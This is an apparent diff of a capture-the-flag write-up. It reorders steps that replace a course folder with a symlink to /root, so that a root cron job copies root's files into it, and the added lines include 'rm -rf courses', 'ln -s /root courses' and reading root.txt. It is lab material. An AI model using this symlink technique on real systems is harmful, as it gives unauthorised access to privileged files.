@@ -255,12 +255,20 @@ chmod 777 * -R;
 We can replace the course folder allocated at work with a symlink to /root.
 We have to wait a minute to the cronjob to take effect and all the content of root will be copied at our courses folder.
 
+To create the symbolic link:
+```bash
+rm -rf courses
+ln -s /root courses
+```
+*Wait 1 minute*
+
 We can grab the flag!
 ```bash
+cd courses
 cat root.txt
 ```
 
-To create the symbolic link:
+
 
 
 
